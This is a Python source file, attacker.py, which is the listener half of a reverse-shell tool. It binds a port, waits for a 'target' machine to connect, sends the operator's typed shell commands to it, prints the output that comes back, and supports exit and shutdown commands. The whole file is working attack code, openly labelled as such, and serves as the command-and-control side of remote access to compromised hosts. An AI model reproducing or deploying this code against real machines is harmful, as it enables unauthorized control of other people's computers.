# ========================================================================
# $File: attacker.py $
# $Date: 2019-01-21 23:03:34 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale

import command
import constant
import logger


LISTEN_COUNT = 1


def process_cmd_continue(in_cmd):
    """Process commmand that need to be continue.

    @param { stirng } in_cmd : Command string.
    """

    # No need to receive if just changing the directory.
    if "cd" in in_cmd:
        return True

    if in_cmd == "cls" or in_cmd == "clear":
        os.system('cls')
        os.system('clear')
        return True

    return False

def wait_shell_cmd(path):
    """Prompt the shell info, and receive command input.

    @param { string } path : Shell path to prompt.
    @returns { string } in_cmd : Input command.
    @returns { boolean } iic : Is internal command?
    @returns { string } rl_cmd : Real command that the internal command
    prefex is removed.
    """
    got_input = False
    while not got_input:
        # Get input command.
        in_cmd = input(path + "$ ")
        rl_cmd = in_cmd

        # Check if is internal command type.
        iicp = command.is_internal_command_prefix(in_cmd)
        iic = False
        if iicp:
            # Remove prefix, get the internal command.
            rl_cmd = in_cmd[1:]
            iic = command.is_internal_command(rl_cmd)
            if not iic:
                logger.error(f"'{in_cmd}' is not recognized internal command.")
                continue
        got_input = True
    return (in_cmd, iic, rl_cmd)

def __resolve_hp():
    """Resolve host and port."""
    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        port = int(sys.argv[1])
    else:
        port = constant.PORT

    return port


def main():
    """Program Entry point."""

    port = __resolve_hp()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen(LISTEN_COUNT)

        logger.info(f"Bind port: {port}")

        shutdown = False

        while not shutdown:
            logger.info(f"Waiting target... : {LISTEN_COUNT}")
            conn, addr = s.accept()
            with conn:
                logger.info(f"New target => {addr}")
                while True:
                    # Receive shell info.
                    path = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)

                    in_cmd, iic, rl_cmd = wait_shell_cmd(path)

                    # Check shutdown command before receiving.
                    if iic:
                        # NOTE(jenchieh): Check possible command at this moment.
                        if rl_cmd == command.Command.EXIT.value:
                            logger.info("Attacker exit the target...")
                            break

                    # Send it.
                    conn.sendall(in_cmd.encode(constant.ENCODE_TYPE))

                    # Check shutdown command before receiving.
                    if iic:
                        # NOTE(jenchieh): Check possible command at this moment.
                        if rl_cmd == command.Command.SHUTDOWN.value:
                            logger.info("Attacker shutdown the target...")
                            shutdown = True
                            break


                    if process_cmd_continue(in_cmd):
                        continue

                    # Receive shell command output.
                    outs = conn.recv(constant.BUF_SIZE).decode(constant.DECODE_TYPE)

                    print(outs)

    logger.info("Exit program, done attacking.")

if __name__ == "__main__":
    main()
